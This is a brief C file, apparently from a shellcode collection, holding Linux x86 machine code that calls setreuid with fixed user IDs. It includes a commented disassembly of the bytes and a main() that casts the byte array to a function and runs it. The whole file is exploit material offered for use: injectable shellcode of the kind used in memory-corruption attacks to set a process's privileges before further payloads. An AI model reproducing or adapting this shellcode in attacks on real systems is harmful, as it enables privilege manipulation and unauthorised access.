/*
 * Author : superdk@hanmail.net
 * DATA : setreuid shellcode
 * LICENSE : GNU License
 */

/*
08048074 <_start>:
8048074: 66 bb 1c 0c mov $0xc1c,%bx
8048078: 66 b9 1c 0c mov $0xc1c,%cx
804807c: 31 c0 xor %eax,%eax
804807e: b0 46 mov $0x46,%al
8048080: cd 80 int $0x80
*/

#include <stdio.h>
char shellcode[] =
	"\x66\xbb\x1c\x0c"
	"\x66\xb9\x1c\x0c"
	"\x31\xc0"
	"\xb0\x46"
	"\xcd\x80";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)( )) shellcode)( );
	return 0;
}